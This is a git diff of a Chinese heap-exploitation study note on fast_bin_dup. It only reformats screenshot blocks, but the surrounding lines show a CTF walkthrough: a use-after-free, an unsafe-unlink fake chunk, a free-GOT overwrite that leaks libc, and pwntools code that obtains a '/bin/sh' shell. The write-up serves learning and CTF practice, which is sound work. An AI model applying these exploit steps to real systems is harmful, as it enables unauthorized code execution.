@@ -77,10 +77,11 @@ int main()
 	int *b = malloc(8);
 	int *c = malloc(8);
 ```
-```image-layout
-mode: full
+
+
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260722165209.webp)
-```
+
+
 
 在此处，首先创建三个 `chunk` 其中 `a` 、 `b` 是我们需要的实验用 `chunk` ，`c` 应该是用来与 `top_chunk` 的隔离。
 在之前较低版本时，甚至可以直接进行 `dup` ，即连续 `free` 同一个 `chunk` ，但是对于现在的版本，由于添加了检查，常见的利用方式是：先 `free` 一个其他 `chunk` 随后再进行 `dup`
@@ -217,10 +218,11 @@ int main()
 	int *b = malloc(8);
 	int *c = malloc(8);
 ```
-```image-layout
-mode: full
+
+
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260723085355.webp)
-```
+
+
 ```cpp
 	fprintf(stderr, "Freeing the first one...\n");
 	free(a);
@@ -368,23 +370,26 @@ leak("leak_libc", leak_libc)
 leak("lib_base", lib_base)
 itr()
 ```
-```image-layout
-mode: full
+
+
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726210851.webp)
-```
+
+
 
 ---
 #### 分析与利用
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260725152142.webp)
 题目只提供两个功能：`Search` 跟 `Index` 
-```image-layout
-mode: full
+
+
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726212621.webp)
-```
-```image-layout
-mode: full
+
+
+
+
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726213441.webp)
-```
+
+
 
 题目的漏洞出现在 `search` 中，由于仅仅 `free` 了句块，并没有将其置零，与此同时，没有对词块进行任何处理，导致出现了 `UAF` 漏洞，那么有没有可能在这个地方实现 `dup` 呢？请看下图进入删除的条件分支![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726213624.webp)
 分析后得到以下三个条件：
@@ -418,10 +423,11 @@ search(b"\x00" * 4)
 delete(b"y")
 delete(b"n")
 ```
-```image-layout
-mode: full
+
+
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726230447.webp)
-```
+
+
 
 另需说明，多句子中，词链表仍然会继续延伸，因此，在多次 `Index` 之后进行一次 `Search` 即可，同时由于 `chunk_c` 最后被 `free` 其链表为空，`dup` 时不会参与到查询中![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726231140.webp)
 此时可以看到调用链已经被我们修改，可以在看一下对应的数据![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726231351.webp)
@@ -661,10 +667,11 @@ add(2, b"/bin/sh\0")
 delete(2)
 itr()
 ```
-```image-layout
-mode: full
+
+
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260728103833.webp)
-```
+
+
 
 ---
 #### 分析与利用
@@ -682,20 +689,22 @@ add(1, b"aaaa")
 add(2, b"bbbb")
 delete(1)
 ```
-```image-layout
-mode: full
+
+
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729153552.webp)
-```
+
+
 
 可以看到此时 `chunk1_a` 处于 `fast_bin` 链表中
 ```python
 add(3, b"cccc")
 delete(1)
 ```
-```image-layout
-mode: full
+
+
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729154603.webp)
-```
+
+
 
 执行完之后可以看到，此时就已经实现了 `dup` ，但是更重要的是能够为接下来的合并做准备，将 `chunk_b` 的标志位置 `0` 以便进行下一步 `unsafe_unlink_attack` 。其中创建 `chunk3` 就是为了让 `fast_bin_chunk` 转到对应的 `small_bin` 中，把同样的 `chunk` 置于不同的链表中，以此绕过 `double_free` 检查。接着要做的就是伪造 `fake_chunk` 。需要注意的是，为了满足 `unlink` 的链表检查，我们需要构造一个特殊的结构，满足 `*(FD->bk) == *(BK->fd)` ，我们的解决方案是直接使 `FD->bk == BK->fd` ，由于链表中指向的是 `chunk` 头，地址就需要减去对应的数值，如以上代码块所示，最后的 `b"\x20"` 也是为了满足合并的条件
 ```python
@@ -709,22 +718,26 @@ fake_chunk += b"\x20"
 add(1, fake_chunk)
 delete(2)
 ```
-```image-layout
-mode: full
+
+
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729161447.webp)
-```
-```image-layout
-mode: full
+
+
+
+
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729161626.webp)
-```
-```image-layout
-mode: full
+
+
+
+
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729162420.webp)
-```
-```image-layout
-mode: full
+
+
+
+
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729162656.webp)
-```
+
+
 
 我们可以看到 `chunk_a` 的地址被我们改为了 `0x6020b8` ，相对应的，我们就可以随意修改这部分数据，接下来就是要把修改的目标转到 `.got` 区域。通过计算偏移，能够很容易的构造以下恶意数据，执行完毕之后，即将 `free_got` 改写为 `puts` 函数的地址，然后即可完成泄露
 ```python
@@ -739,18 +752,21 @@ delete(2)
 lib_base = uu64(io.recv(6)) - lib.sym["puts"]
 leak("lib_base", lib_base)
 ```
-```image-layout
-mode: full
+
+
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729175105.webp)
-```
-```image-layout
-mode: full
+
+
+
+
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729175338.webp)
-```
-```image-layout
-mode: full
+
+
+
+
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729181634.webp)
-```
+
+
 
 泄露 `libc` 基址之后，即可获得 `system` 地址，通过同样的方法，获得 `shell`
 ```python
@@ -761,10 +777,11 @@ add(2, b"/bin/sh\0")
 delete(2)
 itr()
 ```
-```image-layout
-mode: full
+
+
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260730091445.webp)
-```
+
+
 
 ---
 ---
